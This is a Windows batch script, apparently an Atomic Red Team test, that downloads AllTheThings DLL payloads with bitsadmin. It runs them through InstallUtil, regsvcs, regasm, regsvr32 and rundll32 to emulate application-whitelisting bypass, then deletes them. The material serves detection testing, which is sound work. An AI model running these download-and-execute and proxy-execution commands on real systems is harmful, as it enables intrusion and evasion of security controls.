REM Download DLLs
if not exist "C:\Temp\" mkdir C:\Temp
cd C:\Temp
bitsadmin.exe /transfer "ATT" https://github.com/redcanaryco/atomic-red-team/raw/master/Windows/Payloads/AllTheThings/AllTheThingsx64.dll C:\Temp\AllTheThingsx64.dll
timeout /t 1 /nobreak > NUL
bitsadmin.exe /transfer "ATT" https://github.com/redcanaryco/atomic-red-team/raw/master/Windows/Payloads/AllTheThings/AllTheThingsx86.dll C:\Temp\AllTheThingsx86.dll
timeout /t 1 /nobreak > NUL
REM X86
Executing X86 AllTheThings Test
C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThingsx86.dll
C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe AllTheThingsx86.dll
C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U AllTheThingsx86.dll
regsvr32.exe /s /u AllTheThingsx86.dll
regsvr32.exe /s AllTheThingsx86.dll
rundll32 AllTheThingsx86.dll,EntryPoint
REM AMD64
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThingsx64.dll
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regsvcs.exe AllTheThingsx64.dll
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /U AllTheThingsx64.dll
regsvr32.exe /s /u AllTheThingsx64.dll
regsvr32.exe /s AllTheThingsx64.dll
rundll32 AllTheThingsx64.dll,EntryPoint
REM Cleanup
del C:\Temp\AllTheThings*
